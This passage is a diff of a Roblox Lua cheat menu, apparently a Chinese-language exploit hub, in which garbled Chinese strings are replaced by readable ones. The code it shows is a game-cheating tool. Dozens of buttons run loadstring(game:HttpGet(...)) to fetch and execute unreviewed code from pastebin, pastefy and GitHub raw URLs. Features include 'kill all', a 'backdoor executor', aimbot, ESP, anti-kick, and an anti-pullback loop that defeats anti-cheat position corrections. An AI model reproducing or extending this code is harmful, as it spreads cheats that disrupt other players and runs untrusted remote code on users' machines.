-            ButtonInstances.BackNearbyButton.Text = "寰幆鑳屽闄勮繎鐜╁ [鍏抽棴]"
+            ButtonInstances.BackNearbyButton.Text = "循环背对附近玩家 [关闭]"
             ButtonInstances.BackNearbyButton.TextColor3 = Color3.fromRGB(200, 200, 255)
             
             if connections.backNearby then
@@ -2278,45 +2278,45 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
                 connections.backNearby = nil
             end
             
-            showNotification("寰幆鑳屽闄勮繎鐜╁宸插叧闂�", Color3.fromRGB(150, 150, 150))
+            showNotification("循环背对附近玩家已关闭", Color3.fromRGB(150, 150, 150))
         end
     end
 
-    -- 闃叉媺鍥炲姛鑳�
+    -- 防拉回功能
     local function toggleAntiPullback()
         playClickSound()
         antiPullbackEnabled = not antiPullbackEnabled
         
         if antiPullbackEnabled then
-            ButtonInstances.AntiPullbackButton.Text = "闃叉媺鍥� [寮€鍚痌"
+            ButtonInstances.AntiPullbackButton.Text = "防拉回 [开启]"
             ButtonInstances.AntiPullbackButton.TextColor3 = Color3.fromRGB(0, 255, 150)
             
             connections.antiPullback = RunService.Heartbeat:Connect(function()
                 if antiPullbackEnabled and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                     local root = LocalPlayer.Character.HumanoidRootPart
                     
-                    -- 璁板綍褰撳墠浣嶇疆
+                    -- 记录当前位置
                     if not lastPosition then
                         lastPosition = root.Position
                     end
                     
-                    -- 妫€娴嬫槸鍚﹁鎷夊洖锛堜綅缃彉鍖栧ぇ浜庨槇鍊硷級
+                    -- 检测是否被拉回（位置变化大于阈值）
                     local distance = (root.Position - lastPosition).Magnitude
                     
-                    if distance > 100 then -- 濡傛灉琚媺鍥炶秴杩�100鍗曚綅
-                        -- 浼犲洖鍒拌褰曠殑浣嶇疆
+                    if distance > 100 then -- 如果被拉回超过100单位
+                        -- 传回到记录的位置
                         root.CFrame = CFrame.new(lastPosition)
-                        showNotification("妫€娴嬪埌鎷夊洖锛屽凡浼犲洖鍘熶綅", Color3.fromRGB(255, 100, 0))
+                        showNotification("检测到拉回，已传回原位", Color3.fromRGB(255, 100, 0))
                     else
-                        -- 鏇存柊璁板綍鐨勪綅缃�
+                        -- 更新记录的位置
                         lastPosition = root.Position
                     end
                 end
             end)
             
-            showNotification("闃叉媺鍥炲凡寮€鍚紝灏嗛槻姝㈠弽浣滃紛鎷夊洖", Color3.fromRGB(0, 200, 0))
+            showNotification("防拉回已开启，将防止反作弊拉回", Color3.fromRGB(0, 200, 0))
         else
-            ButtonInstances.AntiPullbackButton.Text = "闃叉媺鍥� [鍏抽棴]"
+            ButtonInstances.AntiPullbackButton.Text = "防拉回 [关闭]"
             ButtonInstances.AntiPullbackButton.TextColor3 = Color3.fromRGB(200, 200, 255)
             
             if connections.antiPullback then
@@ -2325,215 +2325,215 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
             end
             
             lastPosition = nil
-            showNotification("闃叉媺鍥炲凡鍏抽棴", Color3.fromRGB(150, 150, 150))
+            showNotification("防拉回已关闭", Color3.fromRGB(150, 150, 150))
         end
     end
 
-    -- 钀藉彾涓績
+    -- 落叶中心
     local function loadFallenLeavesCenter()
         playClickSound()
-        getgenv().LS="钀藉彾涓績"
+        getgenv().LS="落叶中心"
         loadstring(game:HttpGet("https://raw.githubusercontent.com/krlpl/Deciduous-center-LS/main/%E8%90%BD%E5%8F%B6%E4%B8%AD%E5%BF%83%E6%B7%B7%E6%B7%86.txt"))()
-        showNotification("钀藉彾涓績宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("落叶中心已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE濂宠秴浜�
+    -- FE女超人
     local function loadFESuperGirl()
         playClickSound()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Super-Girl-80449"))()
-        showNotification("FE濂宠秴浜哄凡鍔犺浇!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE女超人已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE鍏嶈垂鍔ㄧ敾鍖�
+    -- FE免费动画包
     local function loadFEFreeAnimation()
         playClickSound()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/7yd7/Hub/refs/heads/Branch/GUIS/Emotes.lua"))()
-        showNotification("FE鍏嶈垂鍔ㄧ敾鍖呭凡鍔犺浇!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE免费动画包已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- 鍏ㄥ眬鑱婂ぉ鑴氭湰
+    -- 全局聊天脚本
     local function loadGlobalChat()
         playClickSound()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Ru-chat-Roblox-82664"))()
-        showNotification("鍏ㄥ眬鑱婂ぉ鑴氭湰宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("全局聊天脚本已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE鑾峰彇鍚勭绾垮湀鑴氭湰
+    -- FE获取各种线圈脚本
     local function loadFEGetCoils()
         playClickSound()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Ru-chat-Roblox-82664"))()
-        showNotification("FE鑾峰彇鍚勭绾垮湀鑴氭湰宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE获取各种线圈脚本已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- ============ 鏂版坊鍔犵殑FE鍔熻兘鍑芥暟 ============
+    -- ============ 新添加的FE功能函数 ============
 
-    -- FE鎭堕瓟
+    -- FE恶魔
     local function loadFEDemogorgon()
         playClickSound()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/egoropeez13-ui/FE-Demogorgon-R15-Anim/refs/heads/main/FE"))()
-        showNotification("FE鎭堕瓟宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE恶魔已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FEr6鍔ㄤ綔浼樺寲
+    -- FEr6动作优化
     local function loadFER6AnimationOptimization()
         playClickSound()
         loadstring(game:HttpGet("https://pastefy.app/ZWgckZdU/raw"))()
-        showNotification("FEr6鍔ㄤ綔浼樺寲宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FEr6动作优化已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE鍫曡惤涔嬬
+    -- FE堕落之神
     local function loadFEFallenGod()
         playClickSound()
         loadstring(game:HttpGet("https://pastefy.app/awJrO3Q5/raw"))()
-        showNotification("FE鍫曡惤涔嬬宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE堕落之神已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE绾㈣壊绱㈠凹鍏�
+    -- FE红色索尼克
     local function loadFERedSonic()
         playClickSound()
         loadstring(game:HttpGet("https://pastefy.app/0QSkiaHL/raw"))()
-        showNotification("FE绾㈣壊绱㈠凹鍏嬪凡鍔犺浇!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE红色索尼克已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE exe绱㈠凹鍏�
+    -- FE exe索尼克
     local function loadFEExeSonic()
         playClickSound()
         loadstring(game:HttpGet("https://pastefy.app/XCtZsGhP/raw"))()
-        showNotification("FE exe绱㈠凹鍏嬪凡鍔犺浇!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE exe索尼克已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE灏忓
+    -- FE小孩
     local function loadFEChild()
         playClickSound()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Azizanzz0/Scripts/refs/heads/main/Haram.lua"))()
-        showNotification("FE灏忓宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE小孩已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE鏈烘浜哄伓
+    -- FE机械人偶
     local function loadFEMechanicalDoll()
         playClickSound()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Azizanzz0/Scripts/refs/heads/main/TorMonitorKetua.lua"))()
-        showNotification("FE鏈烘浜哄伓宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE机械人偶已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE灏忔苯杞﹁剼鏈紙鏂板锛�
+    -- FE小汽车脚本（新增）
     local function loadFECarScript()
         playClickSound()
         loadstring(game:HttpGet("https://pastefy.app/UqDEIOpO/raw"))()
-        showNotification("FE灏忔苯杞﹁剼鏈凡鍔犺浇!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE小汽车脚本已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- rob鑴氭湰
+    -- rob脚本
     local function loadROBScript()
         playClickSound()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Zyb150933/ROB/refs/heads/main/ROB.V1"))()
-        showNotification("rob鑴氭湰宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("rob脚本已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- ============ 鏂版坊鍔犵殑鍥涗釜鍔熻兘鍑芥暟 ============
+    -- ============ 新添加的四个功能函数 ============
 
-    -- FE1x4灏忓紵
+    -- FE1x4小弟
     local function loadFE1x4Minion()
         playClickSound()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-1x1x1x1-Lord-by-melon-scripter-81204"))()
-        showNotification("FE1x4灏忓紵宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE1x4小弟已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE kill鎵€鏈変汉
+    -- FE kill所有人
     local function loadFEKillAll()
         playClickSound()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/noritery/twt-killall/refs/heads/main/main.lua"))()
-        showNotification("FE kill鎵€鏈変汉宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE kill所有人已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE璁剧疆鐜╁澶у皬
+    -- FE设置玩家大小
     local function loadFESetPlayerSize()
         playClickSound()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/zyablicevalexei-star/sizefe/refs/heads/main/sizefe.lua"))()
-        showNotification("FE璁剧疆鐜╁澶у皬宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE设置玩家大小已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- 鍚庨棬鎵ц鍣�
+    -- 后门执行器
     local function loadBackdoorExecutor()
         playClickSound()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/melinicovyra-cell/Roblox-script/refs/heads/main/Backdoor.%20Executor"))()
-        showNotification("鍚庨棬鎵ц鍣ㄥ凡鍔犺浇!", Color3.fromRGB(0, 200, 0))
+        showNotification("后门执行器已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- ============ 鏂板鐨凢E澧ㄦ按浜哄姛鑳� ============
+    -- ============ 新增的FE墨水人功能 ============
     local function loadFEInkMan()
         playClickSound()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/qwertys/refs/heads/main/qwerty6.lua"))()
-        showNotification("FE澧ㄦ按浜哄凡鍔犺浇!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE墨水人已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- ============ 鏂板鐨凢E鎺у埗npcV2鍔熻兘 ============
+    -- ============ 新增的FE控制npcV2功能 ============
     local function loadFEControlNPCV2()
         playClickSound()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/qwertys/refs/heads/main/qwerty8.lua"))()
-        showNotification("FE鎺у埗npcV2宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE控制npcV2已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- ============ 鏂板鐨凢E鐢电鏋姛鑳� ============
+    -- ============ 新增的FE电磁枪功能 ============
     local function loadFEElectromagneticGun()
         playClickSound()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/qwertys/refs/heads/main/qwerty10.lua"))()
-        showNotification("FE鐢电鏋凡鍔犺浇!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE电磁枪已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- ============ 鏂板鐨�6涓狥E鍔熻兘鍑芥暟 ============
+    -- ============ 新增的6个FE功能函数 ============
 
-    -- FE鑸炶箞
+    -- FE舞蹈
     local function loadFEDance()
         playClickSound()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Epik-dancezzzzz-r6-reanimation-57423"))()
-        showNotification("FE鑸炶箞宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE舞蹈已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE灏忎笐
+    -- FE小丑
     local function loadFEClown()
         playClickSound()
         loadstring(game:HttpGet("https://gist.githubusercontent.com/Thepopularuser/c3cf480bf56a3554cd69ea5cdc27c744/raw/88a2c305dcce4e79c9501d9ce84973d91a9e298e/gistfile1.txt"))()
-        showNotification("FE灏忎笐宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE小丑已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE宸ㄤ汉璺宠垶
+    -- FE巨人跳舞
     local function loadFEGiantDance()
         playClickSound()
         loadstring(game:HttpGet("https://pastefy.app/Gn9OlT6O/raw"))()
-        showNotification("FE宸ㄤ汉璺宠垶宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE巨人跳舞已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE濂旇窇
+    -- FE奔跑
     local function loadFERun()
         playClickSound()
         loadstring(game:HttpGet("https://gist.githubusercontent.com/josevitor8247-png/9ac5a01e7214e5340c5586edf121dd86/raw/15f038bc493b4b809c5c21a2621b217880185c3b/4.1_BETA.lua"))()
-        showNotification("FE濂旇窇宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE奔跑已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE鎯婂悡
+    -- FE惊吓
     local function loadFEScare()
         playClickSound()
         loadstring(game:HttpGet('https://pastebin.com/raw/DzG8tdy1'))()
-        showNotification("FE鎯婂悡宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE惊吓已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- FE濂囨€綋鍨�
+    -- FE奇怪体型
     local function loadFEWeirdBody()
         playClickSound()
         loadstring(game:HttpGet("https://pastefy.app/IdFZZPtC/raw"))()
-        showNotification("FE濂囨€綋鍨嬪凡鍔犺浇!", Color3.fromRGB(0, 200, 0))
+        showNotification("FE奇怪体型已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- 缁戝畾鎸夐挳浜嬩欢
+    -- 绑定按钮事件
     MinimizeButton.MouseButton1Click:Connect(toggleMinimize)
 
-    -- 鍏抽棴鍓嶄簩娆＄‘璁�
+    -- 关闭前二次确认
     local closeConfirmOpen = false
     CloseButton.MouseButton1Click:Connect(function()
         playClickSound()
 
-        -- 闃叉閲嶅鎵撳紑澶氫釜纭妗�
+        -- 防止重复打开多个确认框
         if closeConfirmOpen or not ScreenGui.Parent then
             return
         end
@@ -2559,7 +2559,7 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
         ConfirmLabel.Size = UDim2.new(1, -20, 0, 55)
         ConfirmLabel.Position = UDim2.new(0, 10, 0, 8)
         ConfirmLabel.BackgroundTransparency = 1
-        ConfirmLabel.Text = "纭畾瑕佸叧闂剼鏈悧锛�"
+        ConfirmLabel.Text = "确定要关闭脚本吗？"
         ConfirmLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
         ConfirmLabel.TextSize = 16
         ConfirmLabel.Font = Enum.Font.GothamBold
@@ -2571,7 +2571,7 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
         CancelCloseButton.Size = UDim2.new(0, 110, 0, 32)
         CancelCloseButton.Position = UDim2.new(0, 18, 1, -43)
         CancelCloseButton.BackgroundColor3 = Color3.fromRGB(70, 70, 100)
-        CancelCloseButton.Text = "鍙栨秷"
+        CancelCloseButton.Text = "取消"
         CancelCloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
         CancelCloseButton.TextSize = 14
         CancelCloseButton.Font = Enum.Font.GothamBold
@@ -2583,7 +2583,7 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
         ConfirmCloseButton.Size = UDim2.new(0, 110, 0, 32)
         ConfirmCloseButton.Position = UDim2.new(1, -128, 1, -43)
         ConfirmCloseButton.BackgroundColor3 = Color3.fromRGB(190, 50, 50)
-        ConfirmCloseButton.Text = "纭鍏抽棴"
+        ConfirmCloseButton.Text = "确认关闭"
         ConfirmCloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
         ConfirmCloseButton.TextSize = 14
         ConfirmCloseButton.Font = Enum.Font.GothamBold
@@ -2603,14 +2603,14 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
         end)
     end)
 
-    -- 涓洪€夐」鍗℃寜閽坊鍔犵偣鍑婚煶鏁�
+    -- 为选项卡按钮添加点击音效
     for _, tabButton in pairs(TabButtons) do
         tabButton.MouseButton1Click:Connect(playClickSound)
     end
 
-    -- 缁戝畾鍔熻兘鎸夐挳
+    -- 绑定功能按钮
     local buttonActions = {
-        -- 鍩虹鍔熻兘
+        -- 基础功能
         NoclipButton = toggleNoclip,
         InfiniteJumpButton = toggleInfiniteJump,
         SpeedButton = changeSpeed,
@@ -2620,7 +2620,7 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
         ClimbWallV2Button = loadClimbWallV2,
         AntiFallButton = loadAntiFall,
         SuicideButton = suicide,
-        FlyButton = loadFly, -- 淇敼涓烘柊鐨勯琛岃剼鏈�
+        FlyButton = loadFly, -- 修改为新的飞行脚本
         InvincibleButton = loadInvincibleScript,
         InvincibleV2Button = loadInvincibleV2,
         InvincibleV3Button = loadInvincibleV3,
@@ -2629,56 +2629,56 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
         PlayerESPButton = togglePlayerESP,
         BulletTrackButton = toggleBulletTrack,
         AntiKickButton = loadAntiKick,
-        -- 鏂版坊鍔犵殑鍔熻兘
+        -- 新添加的功能
         SpamButton = loadSpam,
         FEBaconPrankButton = loadFEBaconPrank,
-        -- 鏂板鍩虹鍔熻兘
+        -- 新增基础功能
         FaceNearbyButton = toggleFaceNearby,
         BackNearbyButton = toggleBackNearby,
         AntiPullbackButton = toggleAntiPullback,
-        -- 鏂版坊鍔犵殑鍚庨棬鎵ц鍣�
+        -- 新添加的后门执行器
         BackdoorExecutorButton = loadBackdoorExecutor,
         
-        -- 绉诲姩鍔熻兘
+        -- 移动功能
         SpinButton = toggleSpin,
         SpinSpeedButton = changeSpinSpeed,
         AutoMoveButton = toggleAutoMove,
         
-        -- 鐜╁浜や簰
+        -- 玩家交互
         TeleportAllButton = teleportAllToMe,
         ViewBackpackButton = viewPlayerBackpack,
-        ClickTeleportButton = function() loadExternalScript("https://rawscripts.net/raw/Universal-Script-Teleport-Tool-25249", "鐐瑰嚮浼犻€�") end,
+        ClickTeleportButton = function() loadExternalScript("https://rawscripts.net/raw/Universal-Script-Teleport-Tool-25249", "点击传送") end,
         AimbotButton = toggleAimbot,
         AutoSpinNearestButton = toggleAutoSpinNearest,
         
-        -- 澶栬鍔熻兘
+        -- 外观功能
         PlayerSizeButton = changePlayerSize,
         
-        -- 涓栫晫鍔熻兘
+        -- 世界功能
         GravityButton = changeGravity,
         NightVisionButton = toggleNightVision,
         UIColorButton = changeUIColor,
         
-        -- FE鍔熻兘
-        FEFacialButton = function() loadExternalScript("https://rawscripts.net/raw/Universal-Script-AFEM-14048", "FE琛ㄦ儏") end,
-        FEHugButton = function() loadExternalScript("https://raw.githubusercontent.com/ExploitFin/Animations/refs/heads/main/Front%20and%20Back%20Hug%20Tool", "FE鎷ユ姳") end,
-        FECrouchButton = function() loadExternalScript("https://raw.githubusercontent.com/Azizanzz0/Scripts/refs/heads/main/Crouching.txt", "FE韫蹭笅") end,
-        FESkyboxButton = function() loadExternalScript("https://rawscripts.net/raw/Universal-Script-Fe-Emote-Player-51936", "FE澶╃┖鐩�") end,
-        FESwordButton = function() loadExternalScript("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Neptunian%20V", "FE鍦ｅ墤") end,
-        FECarButton = function() loadExternalScript("https://rawscripts.net/raw/Universal-Script-FE-SILLY-CAR-V1-48227", "FE浜虹墿鍙樿溅") end,
-        FESpiderManButton = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/铚樿洓渚�.txt", "FE铚樿洓渚�") end,
-        FER6AnimationsButton = function() loadExternalScript("https://rawscripts.net/raw/Universal-Script-R6-Animations-Menu-By-Me-19427", "FER6鍔ㄤ綔") end,
-        FEHamsterBallButton = function() loadExternalScript("https://raw.githubusercontent.com/KaterHub-Inc/scripts/refs/heads/main/unofficial-Projects/FEHamsterBall.lua", "FE婊氳泲") end,
-        FEAutoPianoButton = function() loadExternalScript("https://rawscripts.net/raw/Tac's-Piano-Stuff-Talentless-script-made-by-hellohellohell012321-44088", "FE鑷姩寮归挗鐞�") end,
-        FEControlNPCButton = function() loadExternalScript("https://raw.githubusercontent.com/randomstring0/fe-source/refs/heads/main/NPC/source/main.Luau", "FE鎺у埗NPC") end,
-        FEForsakenAnimButton = function() loadExternalScript("https://raw.githubusercontent.com/CyberNinja103/brodwa/refs/heads/main/ForsakationHub", "FE琚仐寮冨姩浣�") end,
-        FE096Button = function() loadExternalScript("https://github.com/Sinister-Scripts/Roblox-Exploits/raw/refs/heads/main/FE-Animation-GUI-R6", "FE鍚堥泦") end,
-        FEHam00dButton = function() loadExternalScript("https://rawscripts.net/raw/Universal-Script-sb-56309", "fe ham00d鑿滃崟") end,
-        CatAnimButton = function() loadExternalScript("https://pastebin.com/raw/Y1MkBRn3", "鐚姩浣�") end,
+        -- FE功能
+        FEFacialButton = function() loadExternalScript("https://rawscripts.net/raw/Universal-Script-AFEM-14048", "FE表情") end,
+        FEHugButton = function() loadExternalScript("https://raw.githubusercontent.com/ExploitFin/Animations/refs/heads/main/Front%20and%20Back%20Hug%20Tool", "FE拥抱") end,
+        FECrouchButton = function() loadExternalScript("https://raw.githubusercontent.com/Azizanzz0/Scripts/refs/heads/main/Crouching.txt", "FE蹲下") end,
+        FESkyboxButton = function() loadExternalScript("https://rawscripts.net/raw/Universal-Script-Fe-Emote-Player-51936", "FE天空盒") end,
+        FESwordButton = function() loadExternalScript("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Neptunian%20V", "FE圣剑") end,
+        FECarButton = function() loadExternalScript("https://rawscripts.net/raw/Universal-Script-FE-SILLY-CAR-V1-48227", "FE人物变车") end,
+        FESpiderManButton = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/蜘蛛侠.txt", "FE蜘蛛侠") end,
+        FER6AnimationsButton = function() loadExternalScript("https://rawscripts.net/raw/Universal-Script-R6-Animations-Menu-By-Me-19427", "FER6动作") end,
+        FEHamsterBallButton = function() loadExternalScript("https://raw.githubusercontent.com/KaterHub-Inc/scripts/refs/heads/main/unofficial-Projects/FEHamsterBall.lua", "FE滚蛋") end,
+        FEAutoPianoButton = function() loadExternalScript("https://rawscripts.net/raw/Tac's-Piano-Stuff-Talentless-script-made-by-hellohellohell012321-44088", "FE自动弹钢琴") end,
+        FEControlNPCButton = function() loadExternalScript("https://raw.githubusercontent.com/randomstring0/fe-source/refs/heads/main/NPC/source/main.Luau", "FE控制NPC") end,
+        FEForsakenAnimButton = function() loadExternalScript("https://raw.githubusercontent.com/CyberNinja103/brodwa/refs/heads/main/ForsakationHub", "FE被遗弃动作") end,
+        FE096Button = function() loadExternalScript("https://github.com/Sinister-Scripts/Roblox-Exploits/raw/refs/heads/main/FE-Animation-GUI-R6", "FE合集") end,
+        FEHam00dButton = function() loadExternalScript("https://rawscripts.net/raw/Universal-Script-sb-56309", "fe ham00d菜单") end,
+        CatAnimButton = function() loadExternalScript("https://pastebin.com/raw/Y1MkBRn3", "猫动作") end,
         FEAK47Button = function() loadExternalScript("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/AK-47", "FE AK47") end,
-        FESniperButton = function() loadExternalScript("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Sniper", "FE 鐙欏嚮鏋�") end,
-        FER6DeerCanButton = function() loadExternalScript("https://pastefy.app/wa3v2Vgm/raw", "FEr6楣跨綈") end,
-        FER15DeerCanButton = function() loadExternalScript("https://pastefy.app/YZoglOyJ/raw", "FEr15楣跨綈") end,
+        FESniperButton = function() loadExternalScript("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Sniper", "FE 狙击枪") end,
+        FER6DeerCanButton = function() loadExternalScript("https://pastefy.app/wa3v2Vgm/raw", "FEr6鹿罐") end,
+        FER15DeerCanButton = function() loadExternalScript("https://pastefy.app/YZoglOyJ/raw", "FEr15鹿罐") end,
         FE1x1x1x1Button = loadFE1x1x1x1,
         FEHotlineRifleButton = loadFEHotlineRifle,
         FEIronFistButton = loadFEIronFist,
@@ -2697,12 +2697,12 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
         FER15HeadlessButton = loadFER15Headless,
         FEN00kla5KButton = loadFEN00kla5K,
         FESonicButton = loadFESonic,
-        -- 鏂板FE鍔熻兘
+        -- 新增FE功能
         FEVillainButton = loadFEVillain,
         FESuperGirlButton = loadFESuperGirl,
         FEFreeAnimationButton = loadFEFreeAnimation,
         FEGetCoilsButton = loadFEGetCoils,
-        -- 鏂版坊鍔犵殑FE鍔熻兘
+        -- 新添加的FE功能
         FEDemogorgonButton = loadFEDemogorgon,
         FER6AnimationOptimizationButton = loadFER6AnimationOptimization,
         FEFallenGodButton = loadFEFallenGod,
@@ -2710,21 +2710,21 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
         FEExeSonicButton = loadFEExeSonic,
         FEChildButton = loadFEChild,
         FEMechanicalDollButton = loadFEMechanicalDoll,
-        -- 鏂版坊鍔犵殑FE灏忔苯杞﹁剼鏈�
+        -- 新添加的FE小汽车脚本
         FECarScriptButton = loadFECarScript,
-        -- 鏂版坊鍔犵殑FE1x4灏忓紵
+        -- 新添加的FE1x4小弟
         FE1x4MinionButton = loadFE1x4Minion,
-        -- 鏂版坊鍔犵殑FE kill鎵€鏈変汉
+        -- 新添加的FE kill所有人
         FEKillAllButton = loadFEKillAll,
-        -- 鏂版坊鍔犵殑FE璁剧疆鐜╁澶у皬
+        -- 新添加的FE设置玩家大小
         FESetPlayerSizeButton = loadFESetPlayerSize,
-        -- 鏂版坊鍔犵殑FE澧ㄦ按浜�
+        -- 新添加的FE墨水人
         FEInkManButton = loadFEInkMan,
-        -- 鏂版坊鍔犵殑FE鎺у埗npcV2
+        -- 新添加的FE控制npcV2
         FEControlNPCV2Button = loadFEControlNPCV2,
-        -- 鏂版坊鍔犵殑FE鐢电鏋�
+        -- 新添加的FE电磁枪
         FEElectromagneticGunButton = loadFEElectromagneticGun,
-        -- 鏂版坊鍔犵殑6涓狥E鍔熻兘
+        -- 新添加的6个FE功能
         FEDanceButton = loadFEDance,
         FEClownButton = loadFEClown,
         FEGiantDanceButton = loadFEGiantDance,
@@ -2732,116 +2732,116 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
         FEScareButton = loadFEScare,
         FEWeirdBodyButton = loadFEWeirdBody,
         
-        -- 榛戞礊鍔熻兘
-        BlackHoleV6Button = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/V6.txt", "榛戞礊v6") end,
-        BlackHoleV5Button = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/V5.txt", "榛戞礊v5") end,
-        BlackHoleV4Button = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/V4.txt", "榛戞礊v4") end,
-        BlackHoleV3Button = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/V3.txt", "榛戞礊v3") end,
-        BlackHoleV2Button = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/%E7%A3%81%E9%93%81%E9%BB%91%E6%B4%9EV2.txt", "榛戞礊v2") end,
-        BlackHoleV1Button = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/V1.lua.txt", "榛戞礊v1") end,
+        -- 黑洞功能
+        BlackHoleV6Button = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/V6.txt", "黑洞v6") end,
+        BlackHoleV5Button = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/V5.txt", "黑洞v5") end,
+        BlackHoleV4Button = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/V4.txt", "黑洞v4") end,
+        BlackHoleV3Button = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/V3.txt", "黑洞v3") end,
